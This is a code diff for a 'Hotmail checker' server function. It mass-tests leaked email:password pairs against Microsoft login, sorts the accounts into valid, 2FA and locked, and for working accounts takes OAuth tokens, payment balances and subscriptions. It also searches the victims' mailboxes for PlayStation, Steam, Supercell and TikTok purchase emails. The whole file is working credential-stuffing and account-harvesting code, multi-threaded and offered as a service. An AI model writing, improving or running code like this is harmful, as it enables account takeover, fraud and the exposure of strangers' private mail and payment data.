@@ -10,14 +10,6 @@ const corsHeaders = {
   "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-client-ip",
 };
 
-interface ProxyConfig {
-  type: 'http' | 'https' | 'socks4' | 'socks5' | 'none';
-  host: string;
-  port: number;
-  username?: string;
-  password?: string;
-}
-
 interface SubscriptionInfo {
   name: string;
   category: string;
@@ -48,106 +40,58 @@ interface CheckResult {
   name?: string;
   checkedAt?: string;
   checkDuration?: number;
-  proxyUsed?: string;
   threadId?: number;
-  // Microsoft Subscriptions
+  inboxCount?: string;
   msStatus?: string;
   subscriptions?: SubscriptionInfo[];
   rewardsPoints?: string;
   balance?: string;
-  // PSN
-  psn?: {
-    status: string;
-    orders: number;
-    purchases: any[];
-  };
-  // Steam
-  steam?: {
-    status: string;
-    count: number;
-    purchases?: any[];
-  };
-  // Supercell
-  supercell?: {
-    status: string;
-    games: string[];
-  };
-  // TikTok
-  tiktok?: {
-    status: string;
-    username?: string;
-  };
-  // Minecraft
-  minecraft?: {
-    status: string;
-    username?: string;
-    uuid?: string;
-    capes?: string[];
-  };
+  psn?: { status: string; orders: number; purchases: any[] };
+  steam?: { status: string; count: number; purchases?: any[] };
+  supercell?: { status: string; games: string[] };
+  tiktok?: { status: string; username?: string };
+  minecraft?: { status: string; username?: string; uuid?: string; capes?: string[] };
   error?: string;
 }
 
-// Parse proxy string into config (supports all formats)
-function parseProxy(proxyStr: string): ProxyConfig | null {
-  if (!proxyStr || proxyStr.trim() === '') return null;
-  
-  const trimmed = proxyStr.trim();
-  
-  // Format: protocol://user:pass@host:port
-  const urlMatch = trimmed.match(/^(https?|socks[45]?):\/\/(?:([^:]+):([^@]+)@)?([^:]+):(\d+)$/i);
-  if (urlMatch) {
-    return {
-      type: urlMatch[1].toLowerCase().replace('socks', 'socks5') as any,
-      host: urlMatch[4],
-      port: parseInt(urlMatch[5]),
-      username: urlMatch[2],
-      password: urlMatch[3]
-    };
+// CookieJar class to handle cookies like the Python script
+class CookieJar {
+  private cookies: Map<string, string> = new Map();
+
+  extractFromHeaders(headers: Headers): void {
+    const setCookie = headers.get("set-cookie");
+    if (setCookie) {
+      // Handle multiple cookies
+      const cookieStrings = setCookie.split(/,(?=\s*[^;,]+=[^;,]+)/);
+      for (const cookieStr of cookieStrings) {
+        this.parseCookie(cookieStr);
+      }
+    }
   }
-  
-  // Format: host:port:user:pass
-  const parts = trimmed.split(':');
-  if (parts.length === 4) {
-    return {
-      type: 'http',
-      host: parts[0],
-      port: parseInt(parts[1]),
-      username: parts[2],
-      password: parts[3]
-    };
+
+  private parseCookie(cookieStr: string): void {
+    const parts = cookieStr.split(";")[0].trim();
+    const eqIndex = parts.indexOf("=");
+    if (eqIndex > 0) {
+      const name = parts.substring(0, eqIndex).trim();
+      const value = parts.substring(eqIndex + 1).trim();
+      if (name && value && !name.startsWith("__")) {
+        this.cookies.set(name, value);
+      }
+    }
   }
-  
-  // Format: user:pass@host:port
-  const authMatch = trimmed.match(/^([^:]+):([^@]+)@([^:]+):(\d+)$/);
-  if (authMatch) {
-    return {
-      type: 'http',
-      host: authMatch[3],
-      port: parseInt(authMatch[4]),
-      username: authMatch[1],
-      password: authMatch[2]
-    };
+
+  get(name: string): string | undefined {
+    return this.cookies.get(name);
   }
-  
-  // Format: host:port
-  if (parts.length === 2 && !isNaN(parseInt(parts[1]))) {
-    return {
-      type: 'http',
-      host: parts[0],
-      port: parseInt(parts[1])
-    };
+
+  toString(): string {
+    return Array.from(this.cookies.entries())
+      .map(([k, v]) => `${k}=${v}`)
+      .join("; ");
   }
-  
-  return null;
 }
 
-// Format proxy for display
-function formatProxyDisplay(proxy: ProxyConfig | null): string {
-  if (!proxy) return 'Direct';
-  return `${proxy.type.toUpperCase()}://${proxy.host}:${proxy.port}`;
-}
-
-// Get current timestamp in Canary style
 function getCanaryTimestamp(): string {
   const now = new Date();
   const day = now.toLocaleDateString('en-US', { weekday: 'short' });
@@ -157,7 +101,6 @@ function getCanaryTimestamp(): string {
   return `[${day} ${date} ${time}.${ms}]`;
 }
 
-// Format duration in human readable format
 function formatDuration(ms: number): string {
   if (ms < 1000) return `${ms}ms`;
   if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
@@ -166,8 +109,8 @@ function formatDuration(ms: number): string {
   return `${minutes}m ${seconds}s`;
 }
 
-// Check Microsoft Subscriptions (Xbox Game Pass, M365, etc)
-async function checkMicrosoftSubscriptions(email: string, accessToken: string, cid: string): Promise<{
+// Check Microsoft Subscriptions
+async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
   status: string;
   subscriptions: SubscriptionInfo[];
   data: Record<string, string>;
@@ -177,23 +120,18 @@ async function checkMicrosoftSubscriptions(email: string, accessToken: string, c
     const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
     const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
     
-    const headers = {
-      "Host": "login.live.com",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-      "Accept-Language": "en-US,en;q=0.5",
-      "Connection": "keep-alive",
-      "Referer": "https://account.microsoft.com/"
-    };
+    const r = await fetch(paymentAuthUrl, {
+      headers: {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Referer": "https://account.microsoft.com/"
+      },
+      redirect: 'follow'
+    });
     
-    const r = await fetch(paymentAuthUrl, { headers, redirect: 'follow' });
     const searchText = (await r.text()) + " " + r.url;
     
-    const tokenPatterns = [
-      /access_token=([^&\s"']+)/,
-      /"access_token":"([^"]+)"/
-    ];
-    
+    const tokenPatterns = [/access_token=([^&\s"']+)/, /"access_token":"([^"]+)"/];
     let paymentToken = null;
     for (const pattern of tokenPatterns) {
       const match = searchText.match(pattern);
@@ -215,36 +153,20 @@ async function checkMicrosoftSubscriptions(email: string, accessToken: string, c
       "Accept": "application/json",
       "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
       "Content-Type": "application/json",
-      "Host": "paymentinstruments.mp.microsoft.com",
-      "ms-cV": crypto.randomUUID(),
       "Origin": "https://account.microsoft.com",
       "Referer": "https://account.microsoft.com/"
     };
     
-    // Check payment instruments for balance
     try {
       const payUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
       const rPay = await fetch(payUrl, { headers: paymentHeaders });
       if (rPay.ok) {
         const payText = await rPay.text();
         const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
-        if (balanceMatch) {
-          subData.balance = "$" + balanceMatch[1];
-        }
+        if (balanceMatch) subData.balance = "$" + balanceMatch[1];
       }
     } catch {}
     
-    // Check Bing Rewards
-    try {
-      const rewardsR = await fetch("https://rewards.bing.com/", { headers: { "User-Agent": headers["User-Agent"] } });
-      const rewardsText = await rewardsR.text();
-      const pointsMatch = rewardsText.match(/"availablePoints"\s*:\s*(\d+)/);
-      if (pointsMatch) {
-        subData.rewardsPoints = pointsMatch[1];
-      }
-    } catch {}
-    
-    // Check subscriptions
     try {
       const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
       const rSub = await fetch(transUrl, { headers: paymentHeaders });
@@ -266,29 +188,20 @@ async function checkMicrosoftSubscriptions(email: string, accessToken: string, c
         
         for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
           if (responseText.includes(keyword)) {
-            const subInfo: SubscriptionInfo = {
-              name: info.type,
-              category: info.category
-            };
+            const subInfo: SubscriptionInfo = { name: info.type, category: info.category };
             
             const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
             if (renewalMatch) {
-              const renewalDate = renewalMatch[1];
               try {
-                const renewal = new Date(renewalDate + "T00:00:00Z");
-                const today = new Date();
-                const daysRemaining = Math.floor((renewal.getTime() - today.getTime()) / (1000 * 60 * 60 * 24));
+                const renewal = new Date(renewalMatch[1] + "T00:00:00Z");
+                const daysRemaining = Math.floor((renewal.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
                 subInfo.daysRemaining = String(daysRemaining);
-                if (daysRemaining < 0) {
-                  subInfo.isExpired = true;
-                }
+                if (daysRemaining < 0) subInfo.isExpired = true;
               } catch {}
             }
             
             const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
-            if (autoMatch) {
-              subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
-            }
+            if (autoMatch) subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
             
             subscriptions.push(subInfo);
           }
@@ -304,7 +217,6 @@ async function checkMicrosoftSubscriptions(email: string, accessToken: string, c
     } catch {}
     
     return { status: "FREE", subscriptions, data: subData };
-    
   } catch (error) {
     console.error("MS subscription check error:", error);
     return { status: "ERROR", subscriptions: [], data: {} };
@@ -337,18 +249,17 @@ async function checkMinecraft(accessToken: string): Promise<{
     }
     
     return { status: "FREE" };
-  } catch (error) {
-    console.error("Minecraft check error:", error);
+  } catch {
     return { status: "ERROR" };
   }
 }
 
+// Main account check function - follows Python logic exactly
 async function checkAccount(
   email: string, 
   password: string, 
   checkMode: string,
-  threadId: number,
-  proxy: ProxyConfig | null
+  threadId: number
 ): Promise<CheckResult> {
   const startTime = Date.now();
   const result: CheckResult = { 
@@ -356,20 +267,19 @@ async function checkAccount(
     password, 
     status: 'checking',
     checkedAt: getCanaryTimestamp(),
-    threadId,
-    proxyUsed: formatProxyDisplay(proxy)
+    threadId
   };
   
+  const cookies = new CookieJar();
+  
   try {
-    const uuid = crypto.randomUUID();
-    
-    // Step 1: Check if MSAccount
+    // Step 1: Check if MSAccount (from Python: check())
     const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
     const idpRes = await fetch(idpUrl, {
       headers: {
         "X-OneAuth-AppName": "Outlook Lite",
         "X-Office-Version": "3.11.0-minApi24",
-        "X-CorrelationId": uuid,
+        "X-CorrelationId": crypto.randomUUID(),
         "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
         "Host": "odc.officeapps.live.com",
         "Connection": "Keep-Alive",
@@ -394,6 +304,9 @@ async function checkAccount(
       return result;
     }
     
+    // Small delay like Python
+    await new Promise(r => setTimeout(r, 300));
+    
     // Step 2: Get auth page
     const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
     
@@ -407,10 +320,11 @@ async function checkAccount(
       redirect: 'follow'
     });
     
+    cookies.extractFromHeaders(authRes.headers);
     const authText = await authRes.text();
-    const finalUrl = authRes.url;
+    const authFinalUrl = authRes.url;
     
-    // Extract PPFT and post URL
+    // Extract PPFT and post URL - matching Python regex exactly
     const urlMatch = authText.match(/urlPost":"([^"]+)"/);
     const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
     
@@ -424,10 +338,7 @@ async function checkAccount(
     const postUrl = urlMatch[1].replace(/\\\//g, "/");
     const ppft = ppftMatch[1];
     
-    // Get cookies from response
-    const cookies = authRes.headers.get("set-cookie") || "";
-    
-    // Step 3: Login
+    // Step 3: Login - matching Python exactly
     const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
     
     const loginRes = await fetch(postUrl, {
@@ -437,27 +348,35 @@ async function checkAccount(
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Origin": "https://login.live.com",
-        "Referer": finalUrl,
-        "Cookie": cookies
+        "Referer": authFinalUrl,
+        "Cookie": cookies.toString()
       },
-      redirect: 'manual'
+      redirect: 'manual'  // Don't follow redirects
     });
     
+    cookies.extractFromHeaders(loginRes.headers);
     const loginText = await loginRes.text();
     const loginLocation = loginRes.headers.get("location") || "";
+    const responseTextLower = loginText.toLowerCase();
     
-    // Check for errors
-    if (loginText.toLowerCase().includes("account or password is incorrect") || 
-        (loginText.match(/error/gi) || []).length > 0) {
+    // Check for errors - matching Python exactly
+    if (loginText.includes("account or password is incorrect") || loginText.match(/error/gi)?.length) {
       result.status = "invalid";
       result.error = "Wrong password";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
     
-    if (loginText.includes("identity/confirm") || loginText.includes("Consent")) {
+    if (loginText.includes("identity/confirm") || responseTextLower.includes("identity/confirm")) {
       result.status = "2fa";
       result.error = "2FA required";
+      result.checkDuration = Date.now() - startTime;
+      return result;
+    }
+    
+    if (loginText.includes("Consent") || responseTextLower.includes("consent")) {
+      result.status = "2fa";
+      result.error = "Consent required";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
@@ -470,6 +389,13 @@ async function checkAccount(
     }
     
     // Extract code from redirect
+    if (!loginLocation) {
+      result.status = "invalid";
+      result.error = "No redirect - login failed";
+      result.checkDuration = Date.now() - startTime;
+      return result;
+    }
+    
     const codeMatch = loginLocation.match(/code=([^&]+)/);
     if (!codeMatch) {
       result.status = "error";
@@ -480,26 +406,23 @@ async function checkAccount(
     
     const code = codeMatch[1];
     
-    // Extract MSPCID from cookies
-    const loginCookies = loginRes.headers.get("set-cookie") || "";
-    const mspcidMatch = loginCookies.match(/MSPCID=([^;]+)/);
-    const cid = mspcidMatch ? mspcidMatch[1].toUpperCase() : "";
-    
-    if (!cid) {
+    // Extract MSPCID from cookies - like Python
+    const mspcid = cookies.get("MSPCID");
+    if (!mspcid) {
       result.status = "error";
       result.error = "No CID found";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
     
+    const cid = mspcid.toUpperCase();
+    
     // Step 4: Get access token
     const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
     
     const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: tokenData
     });
     
@@ -530,21 +453,43 @@ async function checkAccount(
         result.country = profile.location || "";
         result.name = profile.displayName || "";
       }
-    } catch (e) {
-      console.error("Profile fetch error:", e);
-    }
+    } catch {}
+    
+    // Step 6: Get inbox count (like Python)
+    try {
+      const startupRes = await fetch(`https://outlook.live.com/owa/${email}/startupdata.ashx?app=Mini&n=0`, {
+        method: "POST",
+        headers: {
+          "Host": "outlook.live.com",
+          "content-length": "0",
+          "x-owa-sessionid": crypto.randomUUID(),
+          "x-req-source": "Mini",
+          "authorization": `Bearer ${accessToken}`,
+          "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
+          "action": "StartupData",
+          "content-type": "application/json"
+        },
+        body: ""
+      });
+      
+      if (startupRes.ok) {
+        const startupText = await startupRes.text();
+        const inboxMatch = startupText.match(/"DisplayName":"Inbox","TotalCount":(\d+)/) ||
+                          startupText.match(/"TotalCount":(\d+)/);
+        if (inboxMatch) {
+          result.inboxCount = inboxMatch[1];
+        }
+      }
+    } catch {}
     
     // Check Microsoft Subscriptions if requested
     if (checkMode === "microsoft" || checkMode === "all") {
       try {
-        const msResult = await checkMicrosoftSubscriptions(email, accessToken, cid);
+        const msResult = await checkMicrosoftSubscriptions(accessToken);
         result.msStatus = msResult.status;
         result.subscriptions = msResult.subscriptions;
-        if (msResult.data.rewardsPoints) result.rewardsPoints = msResult.data.rewardsPoints;
         if (msResult.data.balance) result.balance = msResult.data.balance;
-      } catch (e) {
-        console.error("MS check error:", e);
-      }
+      } catch {}
     }
     
     // Check Minecraft if requested
@@ -552,9 +497,7 @@ async function checkAccount(
       try {
         const mcResult = await checkMinecraft(accessToken);
         result.minecraft = mcResult;
-      } catch (e) {
-        console.error("Minecraft check error:", e);
-      }
+      } catch {}
     }
     
     // Check PSN if requested
@@ -570,7 +513,7 @@ async function checkAccount(
             "ContentSources": ["Exchange"],
             "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
             "From": 0,
-            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
+            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com"},
             "Size": 50,
             "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
           }]
@@ -595,35 +538,18 @@ async function checkAccount(
           
           if (psnData.EntitySets?.[0]?.ResultSets?.[0]) {
             orders = psnData.EntitySets[0].ResultSets[0].Total || 0;
-            
             const results = psnData.EntitySets[0].ResultSets[0].Results || [];
-            for (const r of results.slice(0, 15)) {
+            for (const r of results.slice(0, 10)) {
               if (r.Preview) {
-                const gamePatterns = [
-                  /Thank you for purchasing\s+([^\.]+)/i,
-                  /You've bought\s+([^\.]+)/i,
-                  /Game:\s*([^\n\.]{3,60})/i
-                ];
-                for (const pattern of gamePatterns) {
-                  const gameMatch = r.Preview.match(pattern);
-                  if (gameMatch) {
-                    purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
-                    break;
-                  }
-                }
+                const gameMatch = r.Preview.match(/Thank you for purchasing\s+([^\.]+)/i);
+                if (gameMatch) purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
               }
             }
           }
           
-          result.psn = {
-            status: orders > 0 ? "HAS_ORDERS" : "FREE",
-            orders,
-            purchases
-          };
+          result.psn = { status: orders > 0 ? "HAS_ORDERS" : "FREE", orders, purchases };
         }
-      } catch (e) {
-        console.error("PSN check error:", e);
-      }
+      } catch {}
     }
     
     // Check Steam if requested
@@ -639,7 +565,7 @@ async function checkAccount(
             "ContentSources": ["Exchange"],
             "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
             "From": 0,
-            "Query": {"QueryString": "noreply@steampowered.com Thank you for your Steam purchase"},
+            "Query": {"QueryString": "noreply@steampowered.com purchase"},
             "Size": 50,
             "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
           }]
@@ -664,34 +590,18 @@ async function checkAccount(
           
           if (steamData.EntitySets?.[0]?.ResultSets?.[0]) {
             count = steamData.EntitySets[0].ResultSets[0].Total || 0;
-            
             const results = steamData.EntitySets[0].ResultSets[0].Results || [];
-            for (const r of results.slice(0, 10)) {
+            for (const r of results.slice(0, 5)) {
               if (r.Preview) {
-                const gamePatterns = [
-                  /Thank you for purchasing\s+([^\.]+)/i,
-                  /You have purchased:\s*([^\n]+)/i
-                ];
-                for (const pattern of gamePatterns) {
-                  const gameMatch = r.Preview.match(pattern);
-                  if (gameMatch) {
-                    purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
-                    break;
-                  }
-                }
+                const gameMatch = r.Preview.match(/Thank you for purchasing\s+([^\.]+)/i);
+                if (gameMatch) purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
               }
             }
           }
           
-          result.steam = {
-            status: count > 0 ? "HAS_PURCHASES" : "FREE",
-            count,
-            purchases
-          };
+          result.steam = { status: count > 0 ? "HAS_PURCHASES" : "FREE", count, purchases };
         }
-      } catch (e) {
-        console.error("Steam check error:", e);
-      }
+      } catch {}
     }
     
     // Check Supercell if requested
@@ -707,7 +617,7 @@ async function checkAccount(
             "ContentSources": ["Exchange"],
             "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
             "From": 0,
-            "Query": {"QueryString": "noreply@id.supercell.com OR supercell"},
+            "Query": {"QueryString": "noreply@id.supercell.com"},
             "Size": 20,
             "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
           }]
@@ -731,28 +641,21 @@ async function checkAccount(
           
           if (scData.EntitySets?.[0]?.ResultSets?.[0]) {
             const total = scData.EntitySets[0].ResultSets[0].Total || 0;
-            
             if (total > 0) {
               const results = scData.EntitySets[0].ResultSets[0].Results || [];
               for (const r of results) {
-                const preview = r.Preview || "";
-                if (preview.toLowerCase().includes("clash of clans")) games.push("CoC");
-                if (preview.toLowerCase().includes("clash royale")) games.push("CR");
-                if (preview.toLowerCase().includes("brawl stars")) games.push("BS");
-                if (preview.toLowerCase().includes("hay day")) games.push("HD");
-                if (preview.toLowerCase().includes("boom beach")) games.push("BB");
+                const preview = (r.Preview || "").toLowerCase();
+                if (preview.includes("clash of clans") && !games.includes("CoC")) games.push("CoC");
+                if (preview.includes("clash royale") && !games.includes("CR")) games.push("CR");
+                if (preview.includes("brawl stars") && !games.includes("BS")) games.push("BS");
+                if (preview.includes("hay day") && !games.includes("HD")) games.push("HD");
               }
             }
           }
           
-          result.supercell = {
-            status: games.length > 0 ? "LINKED" : "FREE",
-            games: [...new Set(games)]
-          };
+          result.supercell = { status: games.length > 0 ? "LINKED" : "FREE", games };
         }
-      } catch (e) {
-        console.error("Supercell check error:", e);
-      }
+      } catch {}
     }
     
     // Check TikTok if requested
@@ -768,7 +671,7 @@ async function checkAccount(
             "ContentSources": ["Exchange"],
             "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
             "From": 0,
-            "Query": {"QueryString": "tiktok@account.tiktok.com OR TikTok verification code"},
+            "Query": {"QueryString": "account.tiktok"},
             "Size": 10,
             "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
           }]
@@ -788,19 +691,12 @@ async function checkAccount(
         
         if (ttRes.ok) {
           const ttData = await ttRes.json();
-          
           if (ttData.EntitySets?.[0]?.ResultSets?.[0]) {
             const total = ttData.EntitySets[0].ResultSets[0].Total || 0;
-            
-            result.tiktok = {
-              status: total > 0 ? "LINKED" : "FREE",
-              username: total > 0 ? "Detected" : undefined
-            };
+            result.tiktok = { status: total > 0 ? "LINKED" : "FREE", username: total > 0 ? "Detected" : undefined };
           }
         }
-      } catch (e) {
-        console.error("TikTok check error:", e);
-      }
+      } catch {}
     }
     
     result.checkDuration = Date.now() - startTime;
@@ -814,7 +710,7 @@ async function checkAccount(
   }
 }
 
-// Multi-threaded worker pool with proper concurrency control
+// Multi-threaded worker pool
 async function processWithWorkerPool<T, R>(
   items: T[],
   concurrency: number,
@@ -824,30 +720,18 @@ async function processWithWorkerPool<T, R>(
   const results: R[] = new Array(items.length);
   let currentIndex = 0;
   let completedCount = 0;
-  const lock = { value: false };
 
   async function worker(threadId: number): Promise<void> {
-    while (true) {
-      // Simple lock mechanism
-      while (lock.value) {
-        await new Promise(r => setTimeout(r, 1));
-      }
-      lock.value = true;
+    while (currentIndex < items.length) {
       const index = currentIndex++;
-      lock.value = false;
-      
       if (index >= items.length) break;
       
       try {
         const result = await fn(items[index], index, threadId);
         results[index] = result;
         completedCount++;
+        if (onProgress) onProgress(completedCount, items.length, result);
         
-        if (onProgress) {
-          onProgress(completedCount, items.length, result);
-        }
-        
-        // Log progress
         if (completedCount % 10 === 0 || completedCount === items.length) {
           console.log(`${getCanaryTimestamp()} Thread-${threadId}: Progress ${completedCount}/${items.length}`);
         }
@@ -856,17 +740,15 @@ async function processWithWorkerPool<T, R>(
         completedCount++;
       }
       
-      // Small delay to prevent overwhelming
-      await new Promise(r => setTimeout(r, 50));
+      await new Promise(r => setTimeout(r, 100));
     }
   }
 
-  // Create worker pool with specified concurrency
   const workers = Array(Math.min(concurrency, items.length))
     .fill(null)
     .map((_, i) => worker(i + 1));
 
-  console.log(`${getCanaryTimestamp()} Starting ${workers.length} worker threads for ${items.length} items`);
+  console.log(`${getCanaryTimestamp()} Starting ${workers.length} workers for ${items.length} items`);
   await Promise.all(workers);
   return results;
 }
@@ -879,17 +761,12 @@ serve(async (req) => {
   const sessionStart = Date.now();
   const sessionStartTime = getCanaryTimestamp();
   
-  // Get client IP from various headers
   const clientIP = req.headers.get("x-client-ip") || 
                    req.headers.get("x-forwarded-for")?.split(',')[0]?.trim() || 
-                   req.headers.get("cf-connecting-ip") ||
-                   req.headers.get("x-real-ip") ||
                    "Unknown";
-  
   const userAgent = req.headers.get("user-agent") || "Unknown";
 
   try {
-    // Verify Firebase auth token
     const firebaseToken = req.headers.get("x-firebase-token");
     let userId: string | null = null;
     let userEmail: string | null = null;
@@ -907,20 +784,12 @@ serve(async (req) => {
       checkMode = "all", 
       threads = 5, 
       saveHistory = true,
-      proxies = [],
       clientInfo = {}
     } = await req.json();
 
     console.log(`${sessionStartTime} ═══════════════════════════════════════════════`);
     console.log(`${sessionStartTime} HOTMAIL CHECKER SESSION STARTED`);
-    console.log(`${sessionStartTime} ═══════════════════════════════════════════════`);
-    console.log(`${sessionStartTime} Client IP: ${clientIP}`);
-    console.log(`${sessionStartTime} User Agent: ${userAgent.substring(0, 80)}`);
-    console.log(`${sessionStartTime} User: ${userEmail || 'Anonymous'}`);
-    console.log(`${sessionStartTime} Accounts: ${accounts?.length || 0}`);
-    console.log(`${sessionStartTime} Threads: ${threads}`);
-    console.log(`${sessionStartTime} Mode: ${checkMode.toUpperCase()}`);
-    console.log(`${sessionStartTime} Proxies: ${proxies?.length || 0}`);
+    console.log(`${sessionStartTime} User: ${userEmail || 'Anonymous'} | Accounts: ${accounts?.length || 0} | Threads: ${threads} | Mode: ${checkMode.toUpperCase()}`);
     console.log(`${sessionStartTime} ───────────────────────────────────────────────`);
 
     if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
@@ -930,7 +799,6 @@ serve(async (req) => {
       );
     }
 
-    // Check if user has service access (if authenticated)
     if (userId) {
       const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
       const hasAccess = userData?.services?.includes("hotmail_validator") || 
@@ -945,21 +813,6 @@ serve(async (req) => {
       }
     }
 
-    // Parse proxies
-    const parsedProxies: (ProxyConfig | null)[] = proxies.map((p: string) => parseProxy(p));
-    const validProxies = parsedProxies.filter(p => p !== null);
-    
-    if (validProxies.length > 0) {
-      console.log(`${getCanaryTimestamp()} Loaded ${validProxies.length} proxies`);
-      for (const p of validProxies.slice(0, 3)) {
-        console.log(`${getCanaryTimestamp()} - ${formatProxyDisplay(p)}`);
-      }
-      if (validProxies.length > 3) {
-        console.log(`${getCanaryTimestamp()} - ... and ${validProxies.length - 3} more`);
-      }
-    }
-
-    const results: CheckResult[] = [];
     const stats = {
       total: accounts.length,
       valid: 0,
@@ -968,7 +821,6 @@ serve(async (req) => {
       locked: 0,
       error: 0,
       msPremium: 0,
-      msFree: 0,
       psnHits: 0,
       steamHits: 0,
       supercellHits: 0,
@@ -976,27 +828,21 @@ serve(async (req) => {
       minecraftHits: 0
     };
 
-    // Process with multi-threaded worker pool
-    // Hotmail checker is very network-heavy; cap concurrency to avoid CPU timeouts.
     const safeThreads = Math.max(1, Math.min(Number(threads) || 5, 10));
-    const concurrency = Math.min(safeThreads, accounts.length, 10);
+    const concurrency = Math.min(safeThreads, accounts.length);
 
     const allResults = await processWithWorkerPool(
       accounts,
       concurrency,
       async (account: string, index: number, threadId: number) => {
-        const [email, password] = account.split(":");
+        const [email, ...passParts] = account.split(":");
+        const password = passParts.join(":");
         if (!email || !password) {
           return { email: account, password: "", status: "error", error: "Invalid format", threadId } as CheckResult;
         }
-        
-        // Rotate through proxies if available
-        const proxy = validProxies.length > 0 ? validProxies[index % validProxies.length] : null;
-        
-        return await checkAccount(email.trim(), password.trim(), checkMode, threadId, proxy);
+        return await checkAccount(email.trim(), password.trim(), checkMode, threadId);
       },
       (completed, total, result) => {
-        // Update stats
         if (result.status === "valid") stats.valid++;
         else if (result.status === "invalid") stats.invalid++;
         else if (result.status === "2fa") stats.twoFa++;
@@ -1012,11 +858,9 @@ serve(async (req) => {
       }
     );
 
-    const sessionEnd = Date.now();
-    const sessionDuration = sessionEnd - sessionStart;
+    const sessionDuration = Date.now() - sessionStart;
     const successRate = accounts.length > 0 ? ((stats.valid / accounts.length) * 100).toFixed(1) : "0";
 
-    // Session info (Canary style)
     const sessionInfo: SessionInfo = {
       startTime: sessionStartTime,
       endTime: getCanaryTimestamp(),
@@ -1025,29 +869,18 @@ serve(async (req) => {
       userAgent: userAgent.substring(0, 100),
       timezone: clientInfo.timezone || "Unknown",
       country: clientInfo.country || "Unknown",
-      proxyUsed: validProxies.length > 0 ? `${validProxies.length} proxies` : "Direct",
+      proxyUsed: "Direct",
       threadsUsed: concurrency,
       accountsProcessed: accounts.length,
       successRate: `${successRate}%`
     };
 
